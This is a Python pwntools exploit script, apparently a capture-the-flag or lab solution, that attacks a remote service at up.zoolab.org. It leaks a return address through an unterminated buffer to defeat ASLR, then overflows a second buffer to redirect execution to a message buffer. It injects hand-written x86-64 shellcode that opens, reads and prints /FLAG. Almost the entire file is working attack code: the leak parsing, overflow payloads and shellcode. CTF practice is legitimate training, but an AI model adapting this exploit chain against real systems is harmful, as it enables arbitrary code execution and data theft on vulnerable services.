#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

# --- Configuration ---
TASK_RETURN_ADDRESS_OFFSET = 0x9c99
MSG_ADDRESS_OFFSET = 0xef220

context.arch = 'amd64'
context.os = 'linux'
context.endian = "little"
# context.log_level = 'debug'

shellcode_assembly = """
jmp short string_data_marker

code_logic_marker:
    pop rbp
    mov rdi, rbp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    lea rsi, [rbp + 6]
    mov rdx, 64

read:
    mov rax, 0
    syscall

    mov rdx, rax
    mov rdi, 1

    mov rax, 1
    syscall

exit_sequence:
    xor rdi, rdi
    mov rax, 60
    syscall

string_data_marker:
    call code_logic_marker
    .asciz "/FLAG"
"""

try:
    shellcode = asm(shellcode_assembly)
except PwnlibException as e:
    log.error(f"Error assembling shellcode: {e}")
    sys.exit(1)

# --- Connection ---
r = remote('up.zoolab.org', 12342)

try:
    # --- Stage 1: Trigger Leak with buf1 ---
    # 策略：發送 56 個 'A' 填充到返回位址之前
    # printf("%s", buf1) 將會印出 "Welcome, " + 56 'A's + 返回位址
    r.recvuntil(b"What's your name? ")
    
    padding_to_reach_just_before_ret_addr = 56
    leak_trigger_payload = b'A' * padding_to_reach_just_before_ret_addr
    
    log.info(f"Sending {len(leak_trigger_payload)} 'A's to buf1 to trigger leak (no newline)...")
    r.send(leak_trigger_payload)

    # --- Stage 2: Receive and Parse the Leak ---
    log.info("Attempting to receive data for leak (after sending to buf1)...")
    output_containing_leak = b''
    try:
        output_containing_leak = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
    except PwnlibException as e:
        log.error(f"recvuntil timed out or errored waiting for 'What's the room number?': {e}")
        log.info(f"Data received before timeout/error: {r.clean(1)!r}")
        r.close()
        sys.exit(1)
    
    log.info("--- Debugging Leak Data ---")
    log.info(f"Raw output_containing_leak (length {len(output_containing_leak)}):")
    log.info(repr(output_containing_leak))
    log.info("--- End Debugging Leak Data ---")

    address_of_msg = 0 

    try:
        welcome_prefix = b"Welcome, "
        try:
            start_of_our_As_in_output = output_containing_leak.index(welcome_prefix) + len(welcome_prefix)
        except ValueError:
            log.error(f"'{welcome_prefix.decode()}' not found in output. Leak format unexpected.")
            raise PwnlibException("Leak format unexpected: 'Welcome, ' prefix missing.")

        if not output_containing_leak[start_of_our_As_in_output:].startswith(leak_trigger_payload):
            log.error("The expected 'A's were not found after 'Welcome, '. Leak structure is wrong.")
            raise PwnlibException("Leak payload 'A's not where expected")
            
        log.info(f"Our {len(leak_trigger_payload)} 'A's payload found starting at index: {start_of_our_As_in_output} in output.")
        
        start_of_leaked_target_bytes = start_of_our_As_in_output + len(leak_trigger_payload)
        
        bytes_to_leak_count = 6
        slice_for_partial_addr_end = start_of_leaked_target_bytes + bytes_to_leak_count

        log.info(f"Calculated slice indices for partial return address: [{start_of_leaked_target_bytes}:{slice_for_partial_addr_end}]")

        if slice_for_partial_addr_end > len(output_containing_leak):
            log.error(f"Slice end index ({slice_for_partial_addr_end}) for {bytes_to_leak_count} bytes is BEYOND received data length ({len(output_containing_leak)}).")
            raise PwnlibException(f"Not enough data to extract {bytes_to_leak_count} partial address bytes.")

        leaked_6_bytes = output_containing_leak[start_of_leaked_target_bytes : slice_for_partial_addr_end]
        log.info(f"Extracted potential partial address (first 6 bytes) (len {len(leaked_6_bytes)}): {leaked_6_bytes.hex()}")

        if len(leaked_6_bytes) != 6:
            log.error(f"Extracted bytes for partial address are NOT 6 bytes long! Got {len(leaked_6_bytes)}.")
            raise PwnlibException(f"Incorrect number of bytes for partial address: got {len(leaked_6_bytes)}")

        # 假設最高的兩個位元組是 0x0000
        constructed_leaked_addr_bytes = leaked_6_bytes + b"\x00\x00"
        leaked_ret_addr = u64(constructed_leaked_addr_bytes)
        log.warning(f"Constructed address by padding leaked 6 bytes with \\x00\\x00 at MSB: {hex(leaked_ret_addr)}")
        log.success(f"Using this constructed address as 'Leaked return address from task()'")

        executable_base = leaked_ret_addr - TASK_RETURN_ADDRESS_OFFSET
        log.success(f"Calculated executable base: {hex(executable_base)}")

        address_of_msg = executable_base + MSG_ADDRESS_OFFSET
        log.success(f"Calculated address of msg buffer: {hex(address_of_msg)}")

    except ValueError as e: 
        log.error(f"Error finding payload/prefix in output: {e}")
        r.interactive()
        sys.exit(1)
    except PwnlibException as e: 
        log.error(f"Error during leak parsing: {e}")
        r.interactive()
        sys.exit(1)
    except Exception as e: 
        log.error(f"Unexpected error during leak parsing: {e}")
        r.interactive()
        sys.exit(1)

    # --- Stage 3: modity return address ---
    padding_for_buf2_overflow = 104
    overflow_payload_buf2 = b'B' * padding_for_buf2_overflow + p64(address_of_msg)
    log.info(f"Sending overflow payload ({len(overflow_payload_buf2)} bytes) to buf2...")
    r.sendline(overflow_payload_buf2)

    # --- Stage 4: Send benign input for buf3 ---
    r.recvuntil(b"What's the customer's name? ")
    r.sendline(b"AnyName")

    # --- Stage 5: Send Shellcode into msg buffer ---
    r.recvuntil(b"Leave your message: ")
    log.info("Sending shellcode into msg buffer...")
    r.send(shellcode) 
    
    # --- Stage 6: Get Flag ---
    log.success("Payloads sent. Shellcode should execute when task() returns.")
    log.success("Attempting to receive flag output...")
    flag_output = r.recvall(timeout=3.0)
    log.success("--- FLAG ---")
    if flag_output:
        try:
            decoded_output = flag_output.decode(errors='ignore').strip()

            start_index = decoded_output.find("FLAG{")
            if start_index != -1:
                end_index = decoded_output.find("}", start_index)
                if end_index != -1:
                    flag_only = decoded_output[start_index : end_index + 1]
                    print(flag_only)
                else:
                    log.warning("Found 'FLAG{' but no closing '}'. Printing what was found.")
                    print(decoded_output[start_index:])
            else:
                log.warning("FLAG pattern 'FLAG{' not found in output. Printing full decoded output.")
                print(decoded_output)
        except Exception as e:
            log.error(f"Error decoding or parsing flag: {e}")
            print(repr(flag_output))
    else:
        log.warning("No flag output received.")
    log.success("--------------")

except PwnlibException as e:
    log.critical(f"A PwnlibException occurred: {e}")
except Exception as e:
    log.critical(f"An unexpected Python error occurred in the main script: {e}")
    import traceback
    traceback.print_exc()
    if 'r' in locals() and r.connected():
        log.info("Dropping to interactive to see current state...")
        try:
            r.interactive()
        except: pass
finally:
    if 'r' in locals() and r.connected():
        r.close()